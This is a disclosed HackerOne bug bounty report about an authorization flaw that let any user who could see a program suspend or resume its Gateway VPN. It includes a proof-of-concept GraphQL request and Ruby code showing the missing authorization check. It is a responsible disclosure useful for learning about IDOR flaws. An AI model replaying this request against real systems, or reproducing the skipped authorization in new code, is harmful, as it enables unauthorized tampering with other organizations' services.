# Any user with access to program can resume and suspend HackerOne Gateway

## Report Details
- **Report ID**: 717716
- **URL**: https://hackerone.com/reports/717716
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-10-18T23:24:36.757Z
- **Disclosed**: 2019-10-21T18:47:25.240Z

## Reporter
- **Username**: jobert
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
An Insecure Direct Object Reference (IDOR) vulnerability is present in the `UpdateGatewayProgramStateMutation` that'd allow an attacker to suspend and resume the HackerOne Gateway feature for any program the user has access to. This includes any private programs that use the Gateway product and have a published External Program.

**Proof of concept**
The following GraphQL query can used to resume / suspend the VPN:

```
POST /graphql? HTTP/1.1
Host: hackerone.com
...

{"query":"mutation updateState($input_0:UpdateGatewayProgramStateInput!) {updateGatewayProgramState(input:$input_0) { team { handle } } }","variables":{"input_0":{"team_id":"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=","vpn_suspended":false,"clientMutationId":"0"}}}
```

Replace the `team_id` (base64 encoded) with a team ID that you have access to. For most programs, this will result in a 500 internal server error being returned because the micro service handling VPN configurations can't find the program it needs to update. For programs that use the Gateway product it'll successfully update the VPN status as per the `vpn_suspended` boolean in the GraphQL query.

The vulnerability stems from the fact that the interactors, called by the mutation, do not implement any kind of authorization. The mutation fetches the team from the protected schema, but with a scope that is too broad. Instead of limiting it to programs the current user can manage, it'll return any team that the user can see.

**app/graphql/mutations/update_gateway_program_state_mutation.rb**
```ruby
# ...
def resolve(team_id:, vpn_suspended:)
  current_user = context[:current_user]
  unsafe_team = context.schema.object_from_id(team_id, context)

  safe_team = ProtectedAttribute::SchemaUtility.use_protected_schema(requester: current_user) do
    context[:tics].teams_i_can_see.find unsafe_team.id # <-- incorrectly scoped
  end

  if vpn_suspended
    Interactors::Vpn::SuspendProgram.interact team: safe_team, as_user: current_user
  else
    Interactors::Vpn::ResumeProgram.interact team: safe_team, as_user: current_user
  end

  # ...
```

**app/backend/interactors/vpn/suspend_program.rb**
```ruby
module Interactors
  module Vpn
    class SuspendProgram < HackeroneInteractor
      skip_authorization # <-- authorization check is skipped

      attribute :team, Team, required: true

      private

      def execute
        vpn_client.suspend_program(team.id)
        team.update(vpn_suspended: true)
      end

      # ...
    end
  end
end
```

The **app/backend/interactors/vpn/resume_program.rb** interactor is nearly identical to the code above and also skips the required authorization check.

A number of exceptions were triggered on production to reproduce this vulnerability:
* ████
* █████

## Impact

A user can suspend and resume the HackerOne Gateway product for any program they have access to in the situation the program leverages the Gateway product.

## Attachments
No attachments
